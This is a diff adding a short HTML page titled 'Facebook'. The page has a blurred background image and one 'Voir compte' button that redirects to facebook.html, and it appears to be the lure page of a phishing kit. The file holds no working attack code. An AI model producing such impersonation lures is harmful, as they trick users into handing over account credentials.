@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Facebook</title>
+    <meta property="og:image" content="blur.jpg">
+    <style>
+     
+     body {
+			margin: 0;
+			padding: 0;
+			background-image: url("blur.png");
+			background-size:auto;
+			background-position:0%;
+		}
+
+    </style>
+    <link rel="stylesheet" href="style.css">
+   </head>
+  <body>
+  
+    <div class="container">
+      <button class="button" onclick="window.location.href = 'facebook.html';">Voir compte</button>
+    </div>
+
+  </body>
+</html>
